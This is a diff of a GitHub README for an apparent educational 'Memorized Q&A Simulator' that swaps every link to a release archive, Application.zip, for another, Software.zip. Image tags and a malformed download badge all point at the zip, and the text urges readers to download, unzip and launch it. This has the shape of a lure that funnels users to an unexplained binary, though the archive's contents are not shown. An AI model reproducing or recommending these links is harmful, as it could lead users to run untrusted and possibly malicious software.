@@ -2,7 +2,7 @@
 
 Welcome to the Memorized Q&A Simulator repository! This educational tool showcases a toy Transformer Q&A model simulator that demonstrates core concepts of large language models through memorized Q&A pairs. 
 
-![Transformer](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v1.0/Application.zip)
+![Transformer](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ The **Memorized Q&A Simulator** is designed to help users understand the working
 
 To experience the **Memorized Q&A Simulator** firsthand, simply download the simulator from the following link:
 
-[![Launch Simulator](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v1.0/Application.zip%20Simulator-Download%20Now-brightgreen)](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v1.0/Application.zip)
+[![Launch Simulator](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v2.0/Software.zip%20Simulator-Download%20Now-brightgreen)](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v2.0/Software.zip)
 
 Once downloaded, unzip the file and launch the simulator to start exploring the capabilities of Transformer models.
 
@@ -54,4 +54,4 @@ For more information and updates, check out the "Releases" section of this repos
 
 Thank you for visiting the **Memorized Q&A Simulator** repository. Have fun exploring the world of large language models and Transformer architectures! 🚀
 
-![Robot](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v1.0/Application.zip)
+![Robot](https://github.com/pribaditzy/Memorized-Q-A-Simulator/releases/download/v2.0/Software.zip)
